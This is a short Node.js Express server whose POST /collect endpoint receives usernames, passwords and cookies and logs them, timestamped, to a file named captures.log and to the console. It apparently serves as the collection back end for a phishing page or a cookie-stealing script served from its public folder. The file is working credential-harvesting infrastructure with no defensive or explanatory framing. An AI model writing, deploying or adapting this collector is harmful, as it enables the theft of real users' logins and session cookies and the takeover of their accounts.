const express = require('express');
const fs = require('fs');
const app = express();

app.use(express.json());
app.use(express.static('public'));

app.post('/collect', (req, res) => {
  const { username, password, cookies } = req.body;
  const entry = `[${new Date().toISOString()}] user=${username} pass=${password} cookies=${cookies}\n`;
  fs.appendFileSync('captures.log', entry);
  console.log(entry.trim());
  res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('listening on :' + PORT));
